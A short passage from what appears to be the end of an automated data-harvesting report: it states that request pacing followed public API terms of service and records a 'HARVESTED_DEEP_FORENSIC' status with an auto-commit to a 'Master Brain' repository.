- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
